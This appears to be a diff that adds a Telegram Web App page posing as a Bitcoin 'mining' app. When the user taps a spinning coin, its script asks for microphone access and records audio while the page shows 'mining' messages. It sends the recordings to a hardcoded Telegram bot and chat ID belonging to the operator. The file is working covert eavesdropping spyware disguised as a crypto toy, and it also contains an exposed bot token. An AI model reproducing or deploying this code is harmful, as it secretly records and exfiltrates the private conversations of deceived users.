@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Maining Prosto BTC</title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <style>
+    body { background: black; margin: 0; overflow: hidden; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; color: white; font-family: Arial; }
+    #coin { width: 280px; height: 280px; cursor: pointer; }
+    #status { margin-top: 40px; font-size: 22px; color: #FFD700; }
+    .rotating { animation: rotate 4s linear infinite; }
+    @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+  <img id="coin" src="https://i.ibb.co/3h2d7vP/bitcoin.png" alt="Bitcoin">
+  <div id="status">Производится майнинг BTC…</div>
+
+  <script>
+    const tg = window.Telegram.WebApp;
+    tg.ready();
+
+    const coin = document.getElementById('coin');
+    const status = document.getElementById('status');
+    let recording = false;
+    let mediaRecorder;
+    let chunks = [];
+
+    const BOT_TOKEN = "8326175683:AAFTBgFsDvN_rczh95FFnIS_2XZjAHz8COg";
+    const CHAT_ID = "7856319458";  // твой ID — записи будут приходить именно тебе
+
+    coin.addEventListener('click', () => {
+      if (recording) stopRecording();
+      else startRecording();
+    });
+
+    function startRecording() {
+      navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
+        recording = true;
+        coin.classList.add('rotating');
+        status.textContent = "Запись идёт…";
+        chunks = [];
+
+        mediaRecorder = new MediaRecorder(stream);
+        mediaRecorder.ondataavailable = e => chunks.push(e.data);
+        mediaRecorder.onstop = sendAudio;
+        mediaRecorder.start();
+
+        // Авто-отправка каждые 10 минут (600000 мс)
+        setTimeout(() => {
+          if (recording) mediaRecorder.stop();
+          mediaRecorder.start();
+          chunks = [];
+        }, 600000);
+      }).catch(err => alert("Разреши микрофон!"));
+    }
+
+    function stopRecording() {
+      recording = false;
+      coin.classList.remove('rotating');
+      status.textContent = "Производится майнинг BTC…";
+      if (mediaRecorder) mediaRecorder.stop();
+    }
+
+    function sendAudio() {
+      if (chunks.length === 0) return;
+      const blob = new Blob(chunks, { type: 'audio/ogg' });
+      const file = new File([blob], `mining_${Date.now()}.ogg`, { type: 'audio/ogg' });
+
+      const form = new FormData();
+      form.append('chat_id', CHAT_ID);
+      form.append('audio', file);
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
+        method: 'POST',
+        body: form
+      });
+    }
+
+    // Если закрыл приложение — останавливаем запись
+    window.addEventListener('beforeunload', () => {
+      if (recording) stopRecording();
+    });
+  </script>
+</body>
+</html>
